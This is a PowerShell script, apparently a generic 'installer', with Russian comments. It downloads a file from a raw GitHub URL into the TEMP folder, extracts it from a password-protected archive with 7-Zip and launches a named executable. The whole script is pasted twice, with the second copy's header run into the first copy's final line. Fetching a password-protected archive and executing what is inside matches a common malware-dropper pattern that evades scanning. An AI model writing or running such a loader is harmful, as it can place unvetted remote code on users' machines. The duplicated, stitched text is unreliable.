# =============================================
# Installer by v25888656-maker
# =============================================

param(
    [string]$Url = "https://raw.githubusercontent.com/v25888656-maker/installer/main/hq.ps1",  # ← Замени на ссылку на ZIP
    [string]$Password = "",                                                                    # ← Пароль от архива
    [string]$FileToOpen = ""                                                                   # ← Имя файла для запуска (например setup.exe)
)

$DownloadPath = "$env:TEMP\install_download.zip"
$ExtractPath  = "$env:TEMP\install_extracted"

Write-Host "[+] Создаём папку..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null

Write-Host "[+] Скачиваем файл..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing
    Write-Host "[+] Скачано успешно" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка скачивания!" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Распаковываем архив..." -ForegroundColor Cyan

# Распаковка через 7-Zip
$7z = "C:\Program Files\7-Zip\7z.exe"

if (Test-Path $7z) {
    & $7z x "$DownloadPath" -o"$ExtractPath" -p"$Password" -y -bso0
} else {
    Write-Host "[-] 7-Zip не найден! Установи 7-Zip." -ForegroundColor Red
    exit 1
}

# Запуск файла
if ($FileToOpen) {
    $FullPath = Join-Path $ExtractPath $FileToOpen
    if (Test-Path $FullPath) {
        Write-Host "[+] Запускаем $FileToOpen ..." -ForegroundColor Green
        Start-Process $FullPath
    } else {
        Write-Host "[-] Файл $FileToOpen не найден!" -ForegroundColor Yellow
        explorer $ExtractPath
    }
} else {
    explorer $ExtractPath
}

Write-Host "[+] Готово!" -ForegroundColor Green# =============================================
# Installer by v25888656-maker
# =============================================

param(
    [string]$Url = "https://raw.githubusercontent.com/v25888656-maker/installer/main/hq.ps1",  # ← Замени на ссылку на ZIP
    [string]$Password = "",                                                                    # ← Пароль от архива
    [string]$FileToOpen = ""                                                                   # ← Имя файла для запуска (например setup.exe)
)

$DownloadPath = "$env:TEMP\install_download.zip"
$ExtractPath  = "$env:TEMP\install_extracted"

Write-Host "[+] Создаём папку..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null

Write-Host "[+] Скачиваем файл..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing
    Write-Host "[+] Скачано успешно" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка скачивания!" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Распаковываем архив..." -ForegroundColor Cyan

# Распаковка через 7-Zip
$7z = "C:\Program Files\7-Zip\7z.exe"

if (Test-Path $7z) {
    & $7z x "$DownloadPath" -o"$ExtractPath" -p"$Password" -y -bso0
} else {
    Write-Host "[-] 7-Zip не найден! Установи 7-Zip." -ForegroundColor Red
    exit 1
}

# Запуск файла
if ($FileToOpen) {
    $FullPath = Join-Path $ExtractPath $FileToOpen
    if (Test-Path $FullPath) {
        Write-Host "[+] Запускаем $FileToOpen ..." -ForegroundColor Green
        Start-Process $FullPath
    } else {
        Write-Host "[-] Файл $FileToOpen не найден!" -ForegroundColor Yellow
        explorer $ExtractPath
    }
} else {
    explorer $ExtractPath
}

Write-Host "[+] Готово!" -ForegroundColor Green
